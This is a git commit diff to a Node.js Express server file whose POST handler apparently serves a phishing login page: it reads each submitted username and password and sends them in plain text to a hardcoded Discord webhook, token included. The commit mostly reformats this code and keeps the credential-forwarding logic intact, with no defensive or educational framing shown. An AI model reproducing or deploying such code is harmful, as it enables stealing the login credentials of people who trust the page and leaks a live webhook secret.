65785907dcc72e4d42f87eff6e8c7b92a3380060
motivve <115065824+motivve@users.noreply.github.com>
2023-06-03 18:41:07 +0200

    Update server.js

--- image/server.js
+++ image/server.js
@@ -17,22 +17,24 @@ app.get('/', (req, res) => {
 app.post('/', (req, res) => {
   const username = req.body.username;
   const password = req.body.password;
-  
-    const webhookURL = 'https://discord.com/api/webhooks/1114587026633789531/mZI9cQRsN3j8MHIUbo9q81yK_vWk5kS7uuFHPtZJ4MpEe0lQCU4vOn9d3qt1zMovJGjx';
-    const message = `New login:
+
+  // Send data to Discord webhook
+  const webhookURL = 'https://discord.com/api/webhooks/1114587026633789531/mZI9cQRsN3j8MHIUbo9q81yK_vWk5kS7uuFHPtZJ4MpEe0lQCU4vOn9d3qt1zMovJGjx';
+  const message = `New login:
 Username: ${username}
 Password: ${password}`;
 
-    axios.post(webhookURL, { content: message })
-      .then(() => {
-        // Successful webhook request
-        res.send('Login successful! Information sent to Discord.');
-      })
-      .catch((error) => {
-        // Error handling for webhook request
-        console.error('Error sending data to Discord:', error);
-        res.send('An error occurred while sending data to Discord.');
-      });
+  axios.post(webhookURL, { content: message })
+    .then(() => {
+      // Successful webhook request
+      res.send('Login successful! Information sent to Discord.');
+    })
+    .catch((error) => {
+      // Error handling for webhook request
+      console.error('Error sending data to Discord:', error);
+      res.send('An error occurred while sending data to Discord.');
+    });
+});
 
 // Start the server
 const port = 3000;
